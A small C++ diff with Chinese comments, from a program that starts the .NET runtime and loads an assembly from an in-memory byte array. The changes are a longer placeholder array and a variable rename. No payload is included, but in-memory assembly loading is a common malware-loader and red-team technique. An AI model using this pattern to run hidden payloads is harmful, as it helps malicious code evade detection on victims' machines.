@@ -179,7 +179,7 @@ using namespace mscorlib;
 
 
 unsigned char dotnetRaw[8192] =
-"\x4d\x5a\x90\x00\x03\x00\x00"; //.net程序集数组
+"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00...";//.net程序集字节数组
 
 
 
@@ -190,7 +190,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	ICLRMetaHost* iMetaHost = NULL;
 	ICLRRuntimeInfo* iRuntimeInfo = NULL;
 	ICorRuntimeHost* iRuntimeHost = NULL;
-	IUnknownPtr pAppDomainThunk = NULL;
+	IUnknownPtr pAppDomain = NULL;
 	_AppDomainPtr pDefaultAppDomain = NULL;
 	_AssemblyPtr pAssembly = NULL;
 	_MethodInfoPtr pMethodInfo = NULL;
@@ -208,8 +208,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	iRuntimeHost->Start();
 
 
-	iRuntimeHost->GetDefaultDomain(&pAppDomainThunk);
-	pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);
+	iRuntimeHost->GetDefaultDomain(&pAppDomain);
+	pAppDomain->QueryInterface(__uuidof(_AppDomain), (VOID**)&pDefaultAppDomain);
 
 	saBound[0].cElements = ASSEMBLY_LENGTH;
 	saBound[0].lLbound = 0;
